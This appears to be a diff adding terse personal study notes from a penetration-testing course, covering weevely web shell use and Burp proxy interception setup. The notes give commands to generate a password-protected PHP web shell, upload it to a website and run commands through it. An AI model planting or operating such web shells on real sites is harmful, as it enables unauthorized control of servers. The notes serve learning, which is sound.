@@ -1,0 +1,31 @@
+weevely generate[passord][filename]
+upload generated filename
+weevely[url to file][password]
+help
+
+eg
+weevely generate 123456/root/shell.php
+pwd
+ls
+go to website and upload the file shell.phpcheck if it is uplooaded in browser
+
+#terminal
+weevely url where the file is 123456
+id
+ls
+
+
+#intercepting with burp
+start burpproxy
+options
+
+#in browserpreferences
+advanced
+network
+settings
+use manual config
+put ip as it is in burp
+
+go to interceptinganything you click in browser is intercepted
+
+
